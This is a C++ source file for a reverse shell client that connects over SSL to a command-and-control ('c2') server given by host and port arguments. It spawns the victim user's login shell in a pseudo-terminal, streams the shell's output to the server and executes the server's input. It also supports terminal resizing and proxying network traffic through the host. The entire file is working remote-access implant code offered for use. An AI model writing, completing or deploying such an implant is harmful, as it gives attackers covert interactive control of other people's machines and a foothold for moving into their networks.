////////////////////////////////////////////////////////////////////////////////
// client.cc
// author: jcramb@gmail.com

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <ctype.h>
#include <poll.h>
#include <pwd.h>

#include <cstdlib>
#include <csignal>
#include <cstring>
#include <cstdio>

#include "core.h"
#include "ssl.h"
#include "proxy.h"

#define DEFAULT_ROWS 25
#define DEFAULT_COLS 80
#define READ_BUFSIZE 8192 

////////////////////////////////////////////////////////////////////////////////
// wrapper class for shell spawned in pty

class pty_shell {
public:

    // ctors / dtors
    pty_shell() {}
    ~pty_shell() {}

    // pseudo terminal i/o
    int pty_init(int rows, int cols);
    int pty_read(char * buf, int len);
    int pty_write(const char * buf, int len);

    // getters
    pid_t pid() const { return slave_pid; }
    void window_size(int * rows, int * cols) const;

    // setters
    void resize(int rows, int cols);

protected:
    int master_fd;
    pid_t slave_pid;
    struct winsize ws;
};

////////////////////////////////////////////////////////////////////////////////
// run reverse shell client

int main(int argc, char **argv) {
    pty_shell shell;
    ssl_transport ssl;
    transport & tpt = ssl;
    transport_proxy proxy;
    int read_count = 0;
    int write_count = 0;
    int proxy_count = 0;
    char buf[READ_BUFSIZE];

    // initialise debug log
    log_init(argv[0], LOG_FILE | LOG_ECHO);
    
    // set host ip / port if required
    if (argc > 1) {
        ssl.setopt(SSL_OPT_HOST, argv[1]);
    }
    if (argc > 2) {
        ssl.setopt(SSL_OPT_PORT, argv[2]);
    }

    // connect via SSL to c2 server (blocking)
    if (tpt.init(TPT_CLIENT) < 0) {
        LOG("fatal: failed to establish transport connection\n");    
        exit(-1);
    }

    // spawn shell inside psuedo terminal
    if (shell.pty_init(DEFAULT_ROWS, DEFAULT_COLS) < 0) {
        LOG("fatal: pty init failed!\n");
        exit(-1);
    } else {
        int rows, cols;
        shell.window_size(&rows, &cols);
        LOG("info: spawned %dx%d pty shell (%d)\n", rows, cols, shell.pid());
    }

    // start client loop
    LOG("info: starting loop...\n");
    while (1) {
        
        // check for shell output (read pty pipe) (non-blocking)
        int bytes = shell.pty_read(buf, sizeof(buf));
        if (bytes < 0) {
            LOG("fatal: tty_read(%d)\n", bytes);
            break;
        } else if (bytes > 0) {
            
            // log output to file / stdout
            LOG("RD: [%04d] %d bytes\n", read_count++, bytes);
            hexdump(buf, bytes);

            // send shell output to c2 server
            int bytes_sent = 0;
            while (bytes_sent < bytes) {
                message msg(MSG_RVSHELL, buf + bytes_sent, bytes - bytes_sent);
                tpt.send(msg);
                bytes_sent += msg.body_len();
            }
        } 

        // check for terminal input from c2 server (non-blocking)
        message msg;
        bytes = tpt.recv(msg);
        if (bytes == TPT_CLOSE) {
            LOG("fatal: c2 connection terminated\n");
            break;
        } else if (bytes == TPT_ERROR) {
            LOG("fatal: transport failure\n");
            break;
        } else if (bytes != TPT_EMPTY) {
            
            // handle message based on type
            switch (msg.type()) {

                case MSG_WNDSIZE: { 

                    // log the resize to file / stdout
                    int * rows = (int*)(msg.body());
                    int * cols = (int*)(msg.body() + sizeof(int));
                    LOG("WND: resizing to %dx%d\n", *rows, *cols);

                    // tell the client shell to resize itself
                    shell.resize(*rows, *cols); 
                    break;
                }

                case MSG_RVSHELL: { 

                    // log terminal input to file / stdout
                    LOG("WR: [%04d] %3d '",  write_count++, bytes);
                    for (int i = 0; i < bytes; i++) {
                        if (isprint(msg.body()[i])) {
                            LOG("%c", msg.body()[i]);
                        }
                    }
                    LOG("'\n");

                    //  send tty input to shell (write pty pipe)
                    shell.pty_write(msg.body(), msg.body_len()); 
                    break;
                }

                case MSG_PROXY_INIT:
                case MSG_PROXY_PASS:
                case MSG_PROXY_FAIL:
                case MSG_PROXY_DATA: 
                case MSG_PROXY_DEAD: {
                    LOG("PROXY: [%04d] %d bytes\n", proxy_count++, bytes);
                    hexdump(msg.body(), msg.body_len());
                    proxy.handle_msg(ssl, msg);
                    break;
                }

                default:
                    LOG("error: invalid message type received!\n");
                    break;
            }
        }

        // handle proxy traffic routing
        proxy.poll(ssl);
    }

    LOG("info: client exiting\n");
    return 0;
}

////////////////////////////////////////////////////////////////////////////////
// fork pseudo terminal and execute the slave shell

int pty_shell::pty_init(int rows, int cols) {

    // initialise window size struct
    memset(&ws, 0, sizeof(ws));
    ws.ws_row = rows;
    ws.ws_col = cols;

    // fork the pseudo-terminal, creating master/slave pipe
    slave_pid = forkpty(&master_fd, NULL, NULL, &ws);
    if (slave_pid < 0) {
        return -1;
    }

    // make pipe non-blocking
    int flags = fcntl(master_fd, F_GETFL, 0);
    fcntl(master_fd, F_SETFL, flags | O_NONBLOCK);

    // spawn shell for forked pseudo terminal
    char * shell = NULL;
    if (slave_pid == 0) {
        signal(SIGINT, SIG_DFL);
        setenv("TERM", "vt100", 1);

        // determine the user shell to launch
        struct passwd * user = getpwuid(getuid());
        if (user == NULL || user->pw_shell == NULL) {
            shell = (char*)"/bin/sh";
        } else {
            shell = user->pw_shell;
        }

        // execute the shell in forked pty
        if (execl(shell, shell, "-l", NULL) < 0) {
            exit(EXIT_FAILURE);
        } else {
            exit(EXIT_SUCCESS);
        }
    }

    return 0;
}

////////////////////////////////////////////////////////////////////////////////
// read from the slave shell stdout pipe

int pty_shell::pty_read(char * buf, int len) {

    // confirm that we have a valid pipe
    if (master_fd < 0) {
        return -1;
    }

    // confirm that the slave is still running
    int state;
    pid_t pid = waitpid(slave_pid, &state, WNOHANG);
    if (pid == slave_pid || pid == -1) {
        return -1;
    }

    // confirm that we have data waiting on the pipe
    struct pollfd fd_array;
    fd_array.fd = master_fd;
    fd_array.events = POLLIN;
    int retval = poll(&fd_array, 1, 10); // 10ms wait
    if (retval <= 0) {
        return (errno == EINTR) ? 0 : retval;
    }

    /* -- PENDING REMOVAL AS OSX DOESN'T SUPPORT 'TIOCINQ' --
    // get number of bytes waiting in pipe 
    int bytes_ready;
    retval = ioctl(master_fd, TIOCINQ, &bytes_ready);
    if (retval == -1 || bytes_ready == 0) {
        return 0;
    }

    // read as much as possible from the pipe 
    char * pos = buf;
    int bytes_remaining = MAX(0, MIN(len, bytes_ready)); 
    while (bytes_remaining > 0) {
        int nbytes = read(master_fd, pos, bytes_remaining);
        if (nbytes == -1) {
            if (errno == EINTR) {
                nbytes = 0;
            } else {
                return errno;
            }
        }
        if (nbytes <= 0) {
            break;
        }
        bytes_remaining -= nbytes;
        pos += nbytes;
    }

    return bytes_ready - bytes_remaining;
    */

    int bytes;
    int bytes_read = 0;
    char * pos = buf;
    while ((bytes = read(master_fd, pos, len - bytes_read)) > 0) {
        bytes_read += bytes;
        pos += bytes;
    }

    return bytes_read;
}

////////////////////////////////////////////////////////////////////////////////
// write to the stdin pipe for the slave shell

int pty_shell::pty_write(const char * buf, int len) {
    return write(master_fd, buf, len);
}

////////////////////////////////////////////////////////////////////////////////
// send resize information to pty shell

void pty_shell::resize(int rows, int cols) {
    ws.ws_row = rows;
    ws.ws_col = cols;
    ioctl(master_fd, TIOCSWINSZ, &ws);
    window_size(&rows, &cols);
    LOG("info: pty shell resized to %dx%d\n", rows, cols);
}

////////////////////////////////////////////////////////////////////////////////
// return size of current pty shell window

void pty_shell::window_size(int * rows, int * cols) const {
    struct winsize window_size;
    ioctl(master_fd, TIOCGWINSZ, &window_size);
    if (rows != NULL) *rows = window_size.ws_row;
    if (cols != NULL) *cols = window_size.ws_col;
}

////////////////////////////////////////////////////////////////////////////////
